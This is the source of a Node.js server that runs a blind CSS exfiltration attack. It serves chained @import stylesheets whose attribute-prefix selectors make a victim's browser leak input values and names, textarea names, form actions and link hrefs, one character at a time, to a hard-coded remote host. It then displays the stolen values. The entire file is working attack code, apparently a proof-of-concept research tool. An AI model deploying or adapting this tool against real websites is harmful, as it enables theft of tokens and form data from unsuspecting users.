const connect = require('connect');
const http = require('http');
const url = require('url');
const port = 5001;

const HOSTNAME = "https://blind-css-exfiltration.onrender.com:5001";
const ELEMENTS = ["input","textarea","form","a"];
const ATTRIBUTES = {__proto__:null,"input":["value","name"],"textarea":["name"],"form":["action"],"a":["href"]};
const MAX_ELEMENTS = 20;
const MAX_VALUE = 200;
const WAIT_TIME_MS = 500;
const MAX_SESSION_AMOUNT = 1000;
const SHOW_RESULTS_IN_BROWSER = true;
const SHOW_RESULTS_IN_CONSOLE = true;

const LOWER_LETTERS = "abcdefghijklmnopqrstuvwxyz";
const UPPER_LETTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
const NUMBERS = "0123456789";
const SPACE = ' ';
const SYMBOLS = "!\"#$%&'()*+,-./:;<=>?@[\]^_`{|}~";
const CHARS = (LOWER_LETTERS + NUMBERS + UPPER_LETTERS + SPACE + SYMBOLS).split('');

var session = new Map();

const app = connect();
const compression = require('compression');
app.use(compression());

app.use('/start', function(request, response){
    if(session.size > MAX_SESSION_AMOUNT) {
        deleteOldSessions(Math.floor(MAX_SESSION_AMOUNT/2));
    }
    const ip = getIP(request);
    const settings = new Map();
    settings.set("init", true);
    settings.set('n', 0);
    settings.set('tokens', []);
    settings.set('prefixes', new Map());
    settings.set('foundToken', false);
    settings.set('currentElementPos', 0);
    session.set(ip, settings);
    genResponse(request, response, 0);
});

app.use('/l', function(request, response){
    let req = url.parse(request.url, url);
    const ip = getIP(request);
    if(!hasSession(ip)) {
        response.end();
        return;
    }
    const n = session.get(ip).get('n');
    const prefixes = session.get(ip).get('prefixes');
    const currentElementPos = session.get(ip).get('currentElementPos');
    response.end();
    for(let element of ELEMENTS) {
        for(let attribute of ATTRIBUTES[element]) {                 
            const elementNumber = int(req.query.e, MAX_ELEMENTS);
            if(elementNumber > MAX_ELEMENTS) {                
                return;
            }
            const prefixKey = getPrefix(element, attribute, elementNumber);
            const prefixQueryValue = req.query[prefixKey];
            if(typeof prefixQueryValue === 'undefined') {
                continue;
            }
            if(prefixQueryValue.length > MAX_VALUE) {                
                continue;
            }
            if(n === int(req.query.n, MAX_VALUE) && currentElementPos === elementNumber) {
                if(!prefixes.has(prefixKey)) {
                    prefixes.set(prefixKey, '');
                } 
                if(prefixQueryValue.length > prefixes.get(prefixKey).length) {
                    prefixes.set(prefixKey,String(prefixQueryValue));
                    session.get(ip).set('foundToken',true);             
                }
            }                
        }
    }         
});

app.use('/next', function(request, response){
    setTimeout(x=>{            
        const ip = getIP(request);
        if(!hasSession(ip)) {
            response.end();
            return;
        }
        let foundToken = session.get(ip).get('foundToken');
        if(!foundToken) {
            checkCompleted(request, response);
        } else {
            session.get(ip).set('foundToken', false);
            let n = session.get(ip).get('n');                  
            n++;
            session.get(ip).set('n', n);
            genResponse(request, response, session.get(ip).get('currentElementPos'));                
        }
    }, WAIT_TIME_MS);
});

app.use('/c', function(request, response){
    response.end();
    const ip = getIP(request);
    if(!hasSession(ip)) {
        response.end();
        return;
    }
    const tokens = session.get(ip).get('tokens');
    let req = url.parse(request.url, url);
    let attribute = String(req.query.a);
    let tag = String(req.query.t);
    let value = String(req.query.v);

    if(value.length > MAX_VALUE) {
        return;
    }

    if(!ELEMENTS.includes(tag)) {
        return;
    }
    
    if(!ATTRIBUTES[tag].includes(attribute)) {
        return;
    }

    if(!hasToken(tokens,{tag, attribute, value})) {
        tokens.push({tag, attribute, value});
        session.get(ip).set('foundToken',true);
    }       
});

const genResponse = (request, response, elementNumber) => {
    const ip = getIP(request);
    if(!hasSession(ip)) {
        response.end();
        return;
    }

    const n = session.get(ip).get('n');
    const prefixes = session.get(ip).get('prefixes');
    const tokens = session.get(ip).get('tokens');
    let css = '@import url('+ HOSTNAME + '/next?' + Date.now() + ');';
    let properties = [];
    for(let element of ELEMENTS) {
        for(let attribute of ATTRIBUTES[element]) { 
            const variablePrefix = '--'+getPrefix(element,attribute,elementNumber)+'-'+n;  
            const prefixKey = getPrefix(element, attribute, elementNumber);
            if(!prefixes.has(prefixKey)) {
                prefixes.set(prefixKey, '');
            }
            const prefix = prefixes.get(prefixKey);
            css += CHARS.map(e => ('html:has('+element+'['+attribute+'^="' + escapeCSS(prefix + e) + '"]'+generateNotSelectors(tokens, element, attribute)+')' + '{'+variablePrefix+'s:url(' + HOSTNAME + '/l?e='+(elementNumber)+'&n='+n+'&p_'+element[0]+attribute[0]+elementNumber+'=' + encodeURIComponent(prefix + e) +');}')).join('');
            css += 'html:has('+element+'['+attribute+'="'+ escapeCSS(prefix) + '"]){'+variablePrefix+'f:url(' + HOSTNAME + '/c?t='+element+'&a='+attribute+'&e='+elementNumber+'&v=' + encodeURIComponent(prefix) + ')!important;}';
        }
    }
    if(n === 0 && elementNumber === 0) {  
        for(let element of ELEMENTS) {
            for(let attribute of ATTRIBUTES[element]) {         
                for(let i=0;i<MAX_ELEMENTS;i++) { 
                    for(let j=0;j<MAX_VALUE;j++) {         
                        const variablePrefix = '--'+getPrefix(element,attribute,i)+'-'+j;  
                        properties.push('var('+variablePrefix+'s,none)');              
                        properties.push('var('+variablePrefix+'f,none)');                    
                    }
                }
            }
        }
        css += `html{background:${properties.join(',')};}`;
    }
    if(SHOW_RESULTS_IN_BROWSER) {
        css += htmlBeforeCSS('Exfiltrating...', false);
    }
    response.writeHead(200, { 'Content-Type': 'text/css'});
    response.write(css);
    response.end();
};

const server = http.createServer(app).listen(port, (err) => {
    if (err) {
        return console.log('[-] Error: something bad happened', err);
    }
    console.log('[+] Server is listening on %d', port);
});

function escapeCSS(str) {
    return str.replace(/(["\\])/g,'\\$1');
}

function hasToken(tokens, newToken) {
    if(!tokens.length) {
        return false;
    }
    let{tag, attribute, value} = newToken;
    return tokens.find(tokenObject => tag === tokenObject.tag && attribute === tokenObject.attribute && value === tokenObject.value);
}

function checkCompleted(request, response) {
    const ip = getIP(request);
    if(!hasSession(ip)) {
        response.end();
        return;
    }
    let currentElementPos = session.get(ip).get('currentElementPos');
    if(currentElementPos + 1 < MAX_ELEMENTS) {    
        session.get(ip).set('n', 0);
        session.get(ip).set('currentElementPos', ++currentElementPos);
        genResponse(request, response, currentElementPos);
    } else {    
        completed(request, response);
    }
}

function destroySession(request) {
    const ip = getIP(request);
    session.delete(ip);
}

function htmlBeforeCSS(text, important) {
    return `html:before {
        position:fixed;
        color: #155724;
        background-color: #d4edda;
        border-bottom: 5px solid #c3e6cb;
        padding: 0.75rem 1.25rem;
        font-size: 40px;
        padding: 5px;
        height:100px;
        width:100%;
        content: "${text}"${important?"!important":""};
        font-family:Arial;
        box-sizing: border-box;
        z-index: 2147483647;
        display: flex;
        align-items: center;
    }`;
}

function completed(request, response) {
    const ip = getIP(request);
    const tokens = session.get(ip).get('tokens',true);
    if(SHOW_RESULTS_IN_CONSOLE) {
        console.log("Completed.", tokens);
    }
    if(!SHOW_RESULTS_IN_BROWSER) {
        response.end();
        destroySession(request);
        return;
    }
    let extractedValues = '';
    for(let tokenObject of tokens) {
        let{tag, attribute, value} = tokenObject;
        extractedValues += `\\0aTag:\\09\\09\\09\\09 ${escapeCSS(tag)}\\0a Attribute:\\09\\09\\09 ${escapeCSS(attribute)}\\0a Value:\\09\\09\\09 ${escapeCSS(value)}\\0a`;
    }
    response.writeHead(200, { 'Content-Type': 'text/css'});
    response.write(`
        ${htmlBeforeCSS("CSS exfiltration complete", true)}
        html:after{
            color: #155724;
                background-color: #d4edda;
                border-color: #c3e6cb;
                padding: 0.75rem 1.25rem;
                border: 1px solid transparent;
            content: "The content on the webpage has been successfully exfiltrated and sent to a remote server. \\0a This is what has been extracted:\\0a ${extractedValues}";
            position:fixed;
            left:0;
            top:100px;
            padding:5px;
            width: 100%;
            height: calc(100% - 100px);
            overflow: auto;
            white-space: pre;
            font-family:Arial;
            box-sizing: border-box;
            z-index: 2147483647;
        }
    `);
    response.end();
    destroySession(request);
}

function generateNotSelectors(tokens, elementName, attributeName) {
    let selectors = "";
    if(!tokens.length) {
        return '';
    }
    for(const tokenObject of tokens) {
        if(tokenObject.tag === elementName && tokenObject.attribute === attributeName) {
            selectors += ':not('+elementName+'['+escapeCSS(tokenObject.attribute)+'="'+ escapeCSS(tokenObject.value) + '"])';
        }
    }
    return selectors;
}

function getIP(request) {
    let remoteIp = request.socket.remoteAddress;
    if(typeof remoteIp !== 'undefined' && !remoteIp.includes("127.0.0.1") && remoteIp !== "::1") {
        return remoteIp;
    }
    if(typeof request.headers['x-forwarded-for'] === 'string') {
        let ips = request.headers['x-forwarded-for'].split(',');
        return ips.pop().trim();
    }
    return "127.0.0.1";
}

function deleteOldSessions(amount) {
    var i = 0;
    for (var k of session.keys()) {
        if (i++ > amount) {
            break;
        }
        session.delete(k);
    }
}

function hasSession(ip) {
    if(session.has(ip)) {
        const settings = session.get(ip);
        if(settings.has('init') && settings.get('init')) {
            return true;
        }
    }
    return false;
}

function getPrefix(element, attribute, elementNumber) {
    return 'p_'+element[0]+attribute[0]+elementNumber;
}

function int(number, max) {
    number = +number;
    return Number.isNaN(number) ? 0 : Math.min(number, max);
}
